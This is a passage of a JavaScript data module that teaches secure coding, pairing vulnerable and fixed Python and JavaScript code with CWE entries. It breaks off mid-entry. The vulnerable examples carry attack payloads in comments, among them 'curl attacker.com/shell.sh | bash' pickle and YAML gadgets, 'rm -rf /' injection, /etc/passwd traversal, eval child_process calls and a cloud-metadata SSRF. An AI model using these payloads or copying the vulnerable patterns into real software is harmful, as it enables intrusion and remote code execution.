// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Secure Coding Patterns — 12 languages × 15+ vulnerability categories
// Each entry: vulnerable code, secure code, explanation, severity, CWE

export const SECURE_CODING = {

  // ============================================================================
  // PYTHON
  // ============================================================================
  python: {
    language: "Python",
    categories: [
      {
        name: "SQL Injection",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: string concatenation in SQL
import sqlite3
def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)
    return cursor.fetchone()
# Attacker input: ' OR '1'='1' --
# Results in: SELECT * FROM users WHERE username = '' OR '1'='1' --'`,
        secure_code: `# SECURE: parameterized queries
import sqlite3
def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()
# The ? placeholder ensures the input is always treated as data, never as SQL`,
        explanation: "String concatenation in SQL queries allows attackers to inject arbitrary SQL commands. Parameterized queries (using ? or %s placeholders) ensure user input is always treated as data, not executable SQL. This is the single most important defense against SQL injection."
      },
      {
        name: "Command Injection",
        cwe: "CWE-78",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: os.system with user input
import os
def ping_host(host):
    os.system("ping -c 3 " + host)
# Attacker input: ; rm -rf /
# Results in: ping -c 3 ; rm -rf /

# Also vulnerable:
import subprocess
def run_cmd(user_input):
    subprocess.call("echo " + user_input, shell=True)`,
        secure_code: `# SECURE: subprocess with argument list (no shell)
import subprocess
import shlex
def ping_host(host):
    # Validate input first
    if not re.match(r'^[a-zA-Z0-9.\\-]+$', host):
        raise ValueError("Invalid hostname")
    subprocess.run(["ping", "-c", "3", host], capture_output=True)

# SECURE: if shell is absolutely needed, use shlex.quote
def run_cmd(user_input):
    safe = shlex.quote(user_input)
    subprocess.run(f"echo {safe}", shell=True, capture_output=True)`,
        explanation: "Passing user input to os.system() or subprocess with shell=True allows command injection. Use subprocess with a list of arguments (no shell=True) so the OS treats each element as a separate argument. If shell is unavoidable, use shlex.quote() to escape special characters."
      },
      {
        name: "Template Injection (SSTI)",
        cwe: "CWE-1336",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: user input rendered as Jinja2 template
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
# Attacker input: {{config.items()}}
# Exposes all Flask config including SECRET_KEY
# Attacker input: {{''.__class__.__mro__[1].__subclasses__()}}
# Can achieve remote code execution`,
        secure_code: `# SECURE: pass user input as template variable
from flask import Flask, request, render_template_string
from markupsafe import escape
app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    # Option 1: use template variables (preferred)
    return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)
    # Option 2: escape before embedding
    # return f"<h1>Hello {escape(name)}!</h1>"`,
        explanation: "Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a template string before rendering. Jinja2 templates can execute arbitrary Python code via object introspection. Always pass user input as template variables, never concatenate it into the template string."
      },
      {
        name: "Insecure Deserialization (pickle)",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: deserializing untrusted data with pickle
import pickle
import base64

def load_session(cookie_value):
    data = base64.b64decode(cookie_value)
    return pickle.loads(data)  # Arbitrary code execution!

# Attacker crafts a pickle payload:
# import pickle, os
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ('curl attacker.com/shell.sh | bash',))
# payload = base64.b64encode(pickle.dumps(Exploit()))`,
        secure_code: `# SECURE: use JSON or hmac-signed serialization
import json
import hmac
import hashlib
import base64

SECRET = os.environ['SESSION_SECRET']

def save_session(data):
    payload = base64.b64encode(json.dumps(data).encode())
    sig = hmac.new(SECRET.encode(), payload, hashlib.sha256).hexdigest()
    return payload.decode() + '.' + sig

def load_session(cookie_value):
    parts = cookie_value.rsplit('.', 1)
    if len(parts) != 2:
        raise ValueError("Invalid session")
    payload, sig = parts
    expected = hmac.new(SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Tampered session")
    return json.loads(base64.b64decode(payload))`,
        explanation: "Python's pickle module can execute arbitrary code during deserialization. Never unpickle data from untrusted sources. Use JSON for serialization (it can only represent data, not code) and sign payloads with HMAC to detect tampering. If pickle is absolutely necessary, use hmac verification before unpickling."
      },
      {
        name: "Path Traversal",
        cwe: "CWE-22",
        severity: "high",
        vulnerable_code: `# VULNERABLE: direct file path from user input
from flask import Flask, request, send_file
app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/app/uploads/{filename}')
# Attacker input: ../../../etc/passwd
# Results in: /app/uploads/../../../etc/passwd → /etc/passwd`,
        secure_code: `# SECURE: resolve and validate the path
import os
from flask import Flask, request, send_file, abort
app = Flask(__name__)

UPLOAD_DIR = os.path.realpath('/app/uploads')

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    # Strip any directory components
    safe_name = os.path.basename(filename)
    if not safe_name:
        abort(400)
    full_path = os.path.realpath(os.path.join(UPLOAD_DIR, safe_name))
    # Verify the resolved path is still under UPLOAD_DIR
    if not full_path.startswith(UPLOAD_DIR + os.sep):
        abort(403)
    if not os.path.isfile(full_path):
        abort(404)
    return send_file(full_path)`,
        explanation: "Path traversal allows attackers to read or write files outside the intended directory using ../ sequences. Use os.path.basename() to strip directory components, then os.path.realpath() to resolve symlinks, and finally verify the resolved path starts with the allowed directory prefix."
      },
      {
        name: "Weak Password Hashing",
        cwe: "CWE-916",
        severity: "high",
        vulnerable_code: `# VULNERABLE: MD5/SHA for password storage
import hashlib

def store_password(password):
    # MD5 is fast — billions of guesses per second on a GPU
    hashed = hashlib.md5(password.encode()).hexdigest()
    return hashed

# Even SHA-256 with a salt is too fast:
def store_password_v2(password, salt):
    hashed = hashlib.sha256((salt + password).encode()).hexdigest()
    return hashed`,
        secure_code: `# SECURE: use bcrypt or argon2
import bcrypt

def store_password(password):
    # bcrypt auto-generates a salt and is intentionally slow
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
    return hashed

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)

# Even better: argon2 (winner of the Password Hashing Competition)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)

def store_password_v2(password):
    return ph.hash(password)

def verify_password_v2(password, hashed):
    try:
        return ph.verify(hashed, password)
    except Exception:
        return False`,
        explanation: "MD5 and SHA-family hashes are designed to be fast, making them vulnerable to brute-force attacks (billions of attempts per second on modern GPUs). Password hashing requires intentionally slow algorithms like bcrypt (adaptive cost factor) or argon2 (memory-hard, resistant to GPU/ASIC attacks). Always use a library that handles salt generation automatically."
      },
      {
        name: "Hardcoded Credentials",
        cwe: "CWE-798",
        severity: "high",
        vulnerable_code: `# VULNERABLE: credentials in source code
DB_HOST = "prod-db.internal.company.com"
DB_USER = "admin"
DB_PASS = "SuperSecret123!"
API_KEY = "sk-live-abc123def456"

def connect_db():
    return psycopg2.connect(
        host=DB_HOST, user=DB_USER,
        password=DB_PASS, dbname="production"
    )`,
        secure_code: `# SECURE: environment variables + secrets manager
import os
from functools import lru_cache

def get_secret(name):
    """Load from env var, fall back to secrets manager."""
    val = os.environ.get(name)
    if val:
        return val
    # Fall back to cloud secrets manager
    import boto3
    client = boto3.client('secretsmanager')
    response = client.get_secret_value(SecretId=name)
    return response['SecretString']

def connect_db():
    return psycopg2.connect(
        host=os.environ['DB_HOST'],
        user=os.environ['DB_USER'],
        password=get_secret('DB_PASSWORD'),
        dbname=os.environ.get('DB_NAME', 'production')
    )`,
        explanation: "Hardcoded credentials end up in version control, build artifacts, and error logs. They cannot be rotated without a code deploy and are visible to anyone with source access. Use environment variables for non-sensitive config and a secrets manager (AWS Secrets Manager, HashiCorp Vault, etc.) for credentials."
      },
      {
        name: "Insecure YAML Loading",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: yaml.load with untrusted input
import yaml

def parse_config(user_uploaded_yaml):
    config = yaml.load(user_uploaded_yaml)  # Arbitrary code execution!
    return config

# Attacker payload:
# !!python/object/apply:os.system ['curl attacker.com/shell.sh | bash']`,
        secure_code: `# SECURE: use safe_load (or safe_load_all for multi-document)
import yaml

def parse_config(user_uploaded_yaml):
    config = yaml.safe_load(user_uploaded_yaml)
    return config

# For custom types, use SafeLoader with explicit constructors
class Config:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

def config_constructor(loader, node):
    values = loader.construct_mapping(node)
    # Validate allowed keys
    allowed = {'name', 'version', 'debug'}
    if not set(values.keys()).issubset(allowed):
        raise yaml.YAMLError("Unknown config keys")
    return Config(**values)

yaml.SafeLoader.add_constructor('!config', config_constructor)`,
        explanation: "yaml.load() (without SafeLoader) can instantiate arbitrary Python objects, leading to remote code execution. Always use yaml.safe_load() which only allows basic data types (strings, numbers, lists, dicts). If custom types are needed, register explicit constructors on SafeLoader rather than using the default Loader."
      },
      {
        name: "Regex Denial of Service (ReDoS)",
        cwe: "CWE-1333",
        severity: "medium",
        vulnerable_code: `# VULNERABLE: catastrophic backtracking
import re

# This regex takes exponential time on crafted input
email_pattern = re.compile(r'^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\\.[a-zA-Z]+$')

def validate_email(email):
    return bool(email_pattern.match(email))

# Attacker input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
# The nested quantifier ([a-zA-Z0-9]+)+ causes catastrophic backtracking
# Processing time doubles with each additional 'a' character`,
        secure_code: `# SECURE: use non-backtracking patterns or timeouts
import re
import signal

# Fix the regex: remove nested quantifiers
email_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$')

def validate_email(email):
    # Also limit input length
    if len(email) > 254:  # RFC 5321 max
        return False
    return bool(email_pattern.match(email))

# For untrusted patterns, use a timeout
class RegexTimeout(Exception):
    pass

def safe_regex_match(pattern, text, timeout=2):
    def handler(signum, frame):
        raise RegexTimeout("Regex timed out")
    old = signal.signal(signal.SIGALRM, handler)
    signal.alarm(timeout)
    try:
        return re.match(pattern, text)
    except RegexTimeout:
        return None
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, old)`,
        explanation: "Regular expressions with nested quantifiers like (a+)+ or (a|a)* can exhibit catastrophic backtracking, where processing time grows exponentially with input length. Avoid nested quantifiers, limit input length before matching, and consider using the re2 library which guarantees linear-time matching."
      },
      {
        name: "Insecure Random Number Generation",
        cwe: "CWE-330",
        severity: "high",
        vulnerable_code: `# VULNERABLE: using random module for security
import random
import string

def generate_token():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(32))

def generate_reset_code():
    return str(random.randint(100000, 999999))

# random uses Mersenne Twister — predictable after observing 624 outputs`,
        secure_code: `# SECURE: use secrets module (Python 3.6+)
import secrets
import string

def generate_token():
    return secrets.token_urlsafe(32)  # 256 bits of entropy

def generate_reset_code():
    return secrets.token_hex(3)  # 6 hex chars, 24 bits

def generate_api_key():
    return 'dk_' + secrets.token_urlsafe(48)

# For older Python, use os.urandom
import os, hashlib
def generate_token_legacy():
    return hashlib.sha256(os.urandom(64)).hexdigest()`,
        explanation: "Python's random module uses the Mersenne Twister PRNG, which is not cryptographically secure — an attacker who observes 624 consecutive outputs can predict all future values. Use the secrets module (or os.urandom) for tokens, session IDs, password reset codes, API keys, and any security-sensitive random values."
      },
      {
        name: "XML External Entity (XXE)",
        cwe: "CWE-611",
        severity: "high",
        vulnerable_code: `# VULNERABLE: parsing XML with external entities enabled
from lxml import etree

def parse_xml(user_xml):
    parser = etree.XMLParser()
    tree = etree.fromstring(user_xml.encode(), parser)
    return tree

# Attacker payload:
# <?xml version="1.0"?>
# <!DOCTYPE foo [
#   <!ENTITY xxe SYSTEM "file:///etc/passwd">
# ]>
# <data>&xxe;</data>`,
        secure_code: `# SECURE: disable external entities and DTD processing
from lxml import etree
import defusedxml.ElementTree as safe_ET

# Option 1: defusedxml (recommended)
def parse_xml(user_xml):
    return safe_ET.fromstring(user_xml)

# Option 2: lxml with safe parser settings
def parse_xml_lxml(user_xml):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    return etree.fromstring(user_xml.encode(), parser)`,
        explanation: "XML External Entity (XXE) attacks exploit XML parsers that process external entity declarations, allowing file reads, SSRF, and denial of service. Use the defusedxml library which disables dangerous features by default, or configure lxml with resolve_entities=False and no_network=True."
      },
      {
        name: "Race Condition (TOCTOU)",
        cwe: "CWE-367",
        severity: "medium",
        vulnerable_code: `# VULNERABLE: time-of-check to time-of-use
import os

def safe_delete(filepath, allowed_dir):
    # Check: is the file in the allowed directory?
    real = os.path.realpath(filepath)
    if not real.startswith(allowed_dir):
        raise PermissionError("Access denied")
    # Gap: attacker replaces file with symlink here
    # Use: delete the file (now follows symlink!)
    os.remove(real)  # TOCTOU race condition`,
        secure_code: `# SECURE: use file descriptors to eliminate the race
import os

def safe_delete(filepath, allowed_dir):
    # Open with O_NOFOLLOW to prevent symlink following
    try:
        fd = os.open(filepath, os.O_RDONLY | os.O_NOFOLLOW)
    except OSError:
        raise PermissionError("Cannot open file (symlink?)")
    try:
        # Verify via the fd (not the path)
        stat = os.fstat(fd)
        real = os.path.realpath(f'/proc/self/fd/{fd}')
        if not real.startswith(allowed_dir):
            raise PermissionError("Access denied")
        # Delete using the verified path
        os.unlink(real)
    finally:
        os.close(fd)`,
        explanation: "TOCTOU (time-of-check to time-of-use) race conditions occur when a security check and the subsequent operation use a filename rather than a file descriptor. An attacker can replace the file with a symlink between the check and the use. Use file descriptors (open with O_NOFOLLOW, then operate via fd) to bind the check and use to the same inode."
      },
      {
        name: "Information Disclosure in Errors",
        cwe: "CWE-209",
        severity: "medium",
        vulnerable_code: `# VULNERABLE: exposing stack traces and internal details
from flask import Flask, jsonify
app = Flask(__name__)
app.debug = True  # Exposes Werkzeug debugger in production!

@app.route('/api/user/<int:uid>')
def get_user(uid):
    try:
        user = db.query(f"SELECT * FROM users WHERE id = {uid}")
        return jsonify(user)
    except Exception as e:
        # Exposes database schema, query, and stack trace
        return jsonify({"error": str(e), "trace": traceback.format_exc()}), 500`,
        secure_code: `# SECURE: generic errors externally, detailed logs internally
import logging
from flask import Flask, jsonify
app = Flask(__name__)
app.debug = False
logger = logging.getLogger(__name__)

@app.errorhandler(Exception)
def handle_error(e):
    # Log full details internally
    logger.exception("Unhandled error: %s", e)
    # Return generic message to user
    return jsonify({
        "error": "An internal error occurred",
        "request_id": g.get('request_id', 'unknown')
    }), 500

@app.route('/api/user/<int:uid>')
def get_user(uid):
    user = db.get_user(uid)
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify(user)`,
        explanation: "Detailed error messages expose internal implementation details (database schemas, file paths, library versions, stack traces) that help attackers plan further attacks. Log full error details server-side for debugging, but return only generic error messages with a request ID that correlates to the detailed logs."
      },
      {
        name: "Insecure Temporary Files",
        cwe: "CWE-377",
        severity: "medium",
        vulnerable_code: `# VULNERABLE: predictable temp file names
import os

def process_upload(data):
    tmp = '/tmp/upload_' + str(os.getpid()) + '.dat'
    with open(tmp, 'w') as f:
        f.write(data)
    # Process the file...
    result = analyze(tmp)
    os.remove(tmp)
    return result
# Attacker can predict the filename and create a symlink
# /tmp/upload_12345.dat -> /etc/crontab`,
        secure_code: `# SECURE: use tempfile module with proper cleanup
import tempfile
import os

def process_upload(data):
    # mkstemp creates a file with a random name and restrictive permissions
    fd, tmp = tempfile.mkstemp(suffix='.dat', prefix='upload_')
    try:
        os.write(fd, data.encode() if isinstance(data, str) else data)
        os.close(fd)
        result = analyze(tmp)
        return result
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass

# Even better: use a context manager
def process_upload_v2(data):
    with tempfile.NamedTemporaryFile(suffix='.dat', delete=True) as tmp:
        tmp.write(data.encode() if isinstance(data, str) else data)
        tmp.flush()
        return analyze(tmp.name)`,
        explanation: "Creating temporary files with predictable names in world-writable directories (/tmp) enables symlink attacks where an attacker pre-creates a symlink at the predicted path. Use tempfile.mkstemp() or NamedTemporaryFile which create files with random names and restrictive permissions (0600), and always clean up temp files in a finally block."
      },
      {
        name: "Prototype Pollution via JSON Merge",
        cwe: "CWE-915",
        severity: "medium",
        vulnerable_code: `# VULNERABLE: recursive merge without key validation
def deep_merge(base, override):
    for key, value in override.items():
        if isinstance(value, dict) and isinstance(base.get(key), dict):
            deep_merge(base[key], value)
        else:
            base[key] = value
    return base

# Attacker sends: {"__class__": {"__init__": "malicious"}}
# or: {"__globals__": {"os": "replaced"}}
config = deep_merge(defaults, user_input)`,
        secure_code: `# SECURE: validate keys during merge
DANGEROUS_KEYS = frozenset({
    '__class__', '__bases__', '__subclasses__', '__init__',
    '__globals__', '__builtins__', '__import__', '__code__',
    '__reduce__', '__reduce_ex__', '__getattr__', '__setattr__',
    '__delattr__', '__dict__', '__slots__', '__module__',
})

def safe_merge(base, override, allowed_keys=None):
    for key, value in override.items():
        if key.startswith('_'):
            continue  # Skip all dunder/private keys
        if key in DANGEROUS_KEYS:
            continue
        if allowed_keys and key not in allowed_keys:
            continue
        if isinstance(value, dict) and isinstance(base.get(key), dict):
            safe_merge(base[key], value, allowed_keys)
        else:
            base[key] = value
    return base`,
        explanation: "While Python is less vulnerable to prototype pollution than JavaScript, recursive merge functions that accept untrusted input can still overwrite dunder attributes (__class__, __globals__, etc.) leading to unexpected behavior. Filter out keys starting with underscores and maintain an explicit allowlist of valid configuration keys."
      }
    ]
  },

  // ============================================================================
  // JAVASCRIPT / NODE.JS
  // ============================================================================
  javascript: {
    language: "JavaScript / Node.js",
    categories: [
      {
        name: "Cross-Site Scripting (XSS) — Reflected",
        cwe: "CWE-79",
        severity: "high",
        vulnerable_code: `// VULNERABLE: innerHTML with user input
const search = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML =
  '<p>Results for: ' + search + '</p>';
// Attacker URL: ?q=<img src=x onerror=alert(document.cookie)>

// Also vulnerable in React:
function SearchResults({ query }) {
  return <div dangerouslySetInnerHTML={{ __html: query }} />;
}`,
        secure_code: `// SECURE: use textContent or proper escaping
const search = new URLSearchParams(window.location.search).get('q');
const el = document.getElementById('results');
el.textContent = 'Results for: ' + search;

// Or use DOM APIs
const p = document.createElement('p');
p.textContent = 'Results for: ' + search;
el.appendChild(p);

// React — just use JSX (auto-escapes)
function SearchResults({ query }) {
  return <div><p>Results for: {query}</p></div>;
}

// If HTML is needed, sanitize with DOMPurify
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userHtml);`,
        explanation: "Reflected XSS injects malicious scripts via URL parameters or form inputs that are immediately rendered into the page. Use textContent instead of innerHTML for text content, createElement for DOM construction, and DOMPurify when HTML rendering is necessary. React's JSX auto-escapes by default — only dangerouslySetInnerHTML bypasses this."
      },
      {
        name: "Prototype Pollution",
        cwe: "CWE-1321",
        severity: "high",
        vulnerable_code: `// VULNERABLE: recursive merge with untrusted input
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Attacker sends: {"__proto__": {"isAdmin": true}}
merge({}, JSON.parse(userInput));
// Now ALL objects have isAdmin === true
const user = {};
console.log(user.isAdmin); // true!`,
        secure_code: `// SECURE: validate keys and use Object.create(null)
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    // Block prototype pollution vectors
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = Object.create(null);
      }
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Even better: use Map for untrusted key-value data
const config = new Map(Object.entries(JSON.parse(userInput)));`,
        explanation: "Prototype pollution occurs when an attacker can set properties on Object.prototype via __proto__, constructor.prototype, or similar. This affects all objects in the application and can lead to authorization bypasses, denial of service, or remote code execution. Filter dangerous keys and use Object.create(null) for merge targets."
      },
      {
        name: "NoSQL Injection (MongoDB)",
        cwe: "CWE-943",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: user input directly in MongoDB query
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  if (user) res.json({ success: true });
});
// Attacker sends: {"username": "admin", "password": {"$ne": ""}}
// The $ne operator matches any non-empty password
// Also: {"username": {"$gt": ""}, "password": {"$gt": ""}}`,
        secure_code: `// SECURE: validate and sanitize input types
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  // Ensure inputs are strings, not objects
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  // Hash password before comparison
  const user = await db.collection('users').findOne({
    username: username
  });
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Also: use mongo-sanitize to strip $ operators
const sanitize = require('mongo-sanitize');
const cleanInput = sanitize(req.body);`,
        explanation: "MongoDB query operators like $ne, $gt, $regex can be injected when user input is passed directly as query values. Express parses JSON bodies into objects, so {\"$ne\": \"\"} becomes a query operator. Always validate that inputs are the expected type (string, number) before using them in queries, and use mongo-sanitize to strip operator keys."
      },
      {
        name: "Insecure JWT Handling",
        cwe: "CWE-347",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: no algorithm verification
const jwt = require('jsonwebtoken');

app.get('/api/data', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  // Accepts ANY algorithm including 'none'
  const decoded = jwt.verify(token, publicKey);
  res.json({ user: decoded.sub });
});

// Attacker changes header to {"alg": "none"} and removes signature
// Or changes to {"alg": "HS256"} and signs with the public key as HMAC secret`,
        secure_code: `// SECURE: specify allowed algorithms and validate claims
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET;

app.get('/api/data', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],  // Whitelist specific algorithms
      issuer: 'darknode.ai',
      audience: 'darknode-api',
      maxAge: '1h',           // Reject expired tokens
      clockTolerance: 30,     // 30 second clock skew tolerance
    });
    if (!decoded.sub) throw new Error('Missing subject');
    res.json({ user: decoded.sub });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});`,
        explanation: "JWT libraries that don't enforce algorithm verification are vulnerable to the 'alg: none' attack (signature bypass) and the RS256→HS256 confusion attack (signing with the public key as an HMAC secret). Always specify the algorithms option with an explicit whitelist, validate issuer/audience/expiry claims, and never use the token's own alg header to select the verification algorithm."
      },
      {
        name: "Server-Side Request Forgery (SSRF)",
        cwe: "CWE-918",
        severity: "high",
        vulnerable_code: `// VULNERABLE: fetching user-supplied URLs
const fetch = require('node-fetch');

app.get('/api/preview', async (req, res) => {
  const url = req.query.url;
  const response = await fetch(url);
  const html = await response.text();
  res.json({ preview: html.slice(0, 1000) });
});
// Attacker: /api/preview?url=http://169.254.169.254/latest/meta-data/
// Reads AWS instance metadata including IAM credentials
// Or: /api/preview?url=http://localhost:6379/CONFIG+SET+dir+/var/www`,
        secure_code: `// SECURE: validate and restrict URLs
const { URL } = require('url');
const dns = require('dns').promises;
const fetch = require('node-fetch');

const BLOCKED_HOSTS = new Set(['localhost', '127.0.0.1', '0.0.0.0', '::1']);
const BLOCKED_RANGES = [
  /^10\\./, /^172\\.(1[6-9]|2\\d|3[01])\\./, /^192\\.168\\./,
  /^169\\.254\\./, /^100\\.(6[4-9]|[7-9]\\d|1[0-2]\\d)\\./, /^127\\./
];

async function isPrivateUrl(urlStr) {
  const parsed = new URL(urlStr);
  if (!['http:', 'https:'].includes(parsed.protocol)) return true;
  if (BLOCKED_HOSTS.has(parsed.hostname)) return true;
  // Resolve DNS to check for private IPs (DNS rebinding protection)
  const addresses = await dns.resolve4(parsed.hostname).catch(() => []);
  return addresses.some(ip => BLOCKED_RANGES.some(r => r.test(ip)));
}

app.get('/api/preview', async (req, res) => {
  const url = req.query.url;
  try {
    if (await isPrivateUrl(url)) {
      return res.status(403).json({ error: 'URL not allowed' });
    }
    const response = await fetch(url, {
      timeout: 5000,
      redirect: 'error', // Block redirects to private IPs
      size: 1024 * 100,  // 100KB max
    });
    const html = await response.text();
    res.json({ preview: html.slice(0, 1000) });
  } catch {
    res.status(400).json({ error: 'Could not fetch URL' });
  }
});`,
        explanation: "SSRF allows attackers to make the server fetch internal resources (cloud metadata APIs, internal services, localhost). Validate that the URL uses http(s) protocol, resolve the hostname and check that it doesn't point to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x), block redirects (which can redirect to private IPs after the initial check), and set timeouts and size limits."
      },
      {
        name: "Path Traversal in Express",
        cwe: "CWE-22",
        severity: "high",
        vulnerable_code: `// VULNERABLE: serving files based on user input
const path = require('path');
const fs = require('fs');

app.get('/files/:name', (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.params.name);
  res.sendFile(filePath);
});
// Attacker: /files/..%2F..%2F..%2Fetc%2Fpasswd
// URL-decoded: /files/../../../etc/passwd`,
        secure_code: `// SECURE: validate resolved path stays within allowed directory
const path = require('path');
const fs = require('fs');

const UPLOAD_DIR = path.resolve(__dirname, 'uploads');

app.get('/files/:name', (req, res) => {
  // path.basename strips directory traversal
  const safeName = path.basename(req.params.name);
  const filePath = path.resolve(UPLOAD_DIR, safeName);
  // Verify the resolved path is still under UPLOAD_DIR
  if (!filePath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }
  res.sendFile(filePath);
});`,
        explanation: "Express URL-decodes path parameters, so %2F becomes / and ..%2F becomes ../. Use path.basename() to strip directory components, path.resolve() to get the absolute path, and then verify it starts with the intended directory. Never use path.join() alone as it normalizes but doesn't validate boundaries."
      },
      {
        name: "eval() and Function() Injection",
        cwe: "CWE-95",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: eval with user input
app.post('/api/calculate', (req, res) => {
  const expression = req.body.expression;
  const result = eval(expression);
  res.json({ result });
});
// Attacker: {"expression": "require('child_process').execSync('cat /etc/passwd').toString()"}

// Also vulnerable:
const fn = new Function('return ' + userInput);
const result = fn();

// setTimeout/setInterval with strings:
setTimeout("alert(" + userInput + ")", 1000);`,
        secure_code: `// SECURE: use a math expression parser
const mathjs = require('mathjs');

// Create a restricted parser
const parser = mathjs.create(mathjs.all);
const limitedEval = parser.evaluate;

app.post('/api/calculate', (req, res) => {
  const expression = req.body.expression;
  if (typeof expression !== 'string' || expression.length > 200) {
    return res.status(400).json({ error: 'Invalid expression' });
  }
  try {
    // mathjs only evaluates math, not arbitrary JS
    const result = limitedEval(expression);
    res.json({ result: Number(result) });
  } catch {
    res.status(400).json({ error: 'Invalid math expression' });
  }
});`,
        explanation: "eval(), Function(), setTimeout/setInterval with string arguments, and vm.runInNewContext all execute arbitrary JavaScript. In Node.js, this means full system access via require('child_process'). Never eval user input — use domain-specific parsers (mathjs for math, JSON.parse for JSON, etc.) that only understand the intended language."
      },
      {
        name: "Insecure Deserialization (node-serialize)",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: deserializing untrusted data
const serialize = require('node-serialize');

app.get('/profile', (req, res) => {
  const cookie = req.cookies.profile;
  const profile = serialize.unserialize(
    Buffer.from(cookie, 'base64').toString()
  );
  res.render('profile', profile);
});
// Attacker sets cookie to:
// {"name":"_$$ND_FUNC$$_function(){require('child_process').exec('...')}()"}`,
        secure_code: `// SECURE: use JSON for serialization
app.get('/profile', (req, res) => {
  const cookie = req.cookies.profile;
  if (!cookie) return res.redirect('/login');
  try {
    const profile = JSON.parse(
      Buffer.from(cookie, 'base64').toString()
    );
    // Validate expected shape
    if (typeof profile.name !== 'string' || typeof profile.email !== 'string') {
      throw new Error('Invalid profile');
    }
    // Sanitize values
    const safe = {
      name: profile.name.slice(0, 100),
      email: profile.email.slice(0, 200)
    };
    res.render('profile', safe);
  } catch {
    res.clearCookie('profile');
    res.redirect('/login');
  }
});`,
        explanation: "Libraries like node-serialize can execute functions embedded in serialized data. JSON.parse is safe because it can only represent data types (strings, numbers, arrays, objects, booleans, null) — not functions or code. Always use JSON for serialization, validate the shape of parsed data, and sign cookies with a secret to prevent tampering."
      },
      {
        name: "HTTP Header Injection / CRLF",
        cwe: "CWE-113",
        severity: "medium",
        vulnerable_code: `// VULNERABLE: user input in response headers
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.setHeader('Location', url);
  res.status(302).end();
});
// Attacker: /redirect?url=http://evil.com%0d%0aSet-Cookie:%20admin=true
// Injects a Set-Cookie header via CRLF in the Location header`,
        secure_code: `// SECURE: validate and sanitize header values
const { URL } = require('url');

const ALLOWED_REDIRECTS = ['darknode.ai', 'www.darknode.ai'];

app.get('/redirect', (req, res) => {
  const url = req.query.url;
  try {
    const parsed = new URL(url);
    if (!ALLOWED_REDIRECTS.includes(parsed.hostname)) {
      return res.status(400).json({ error: 'Redirect not allowed' });
    }
    // Node.js 18+ automatically rejects headers with newlines
    // For older versions, strip CRLF characters
    const safeUrl = parsed.href.replace(/[\\r\\n]/g, '');
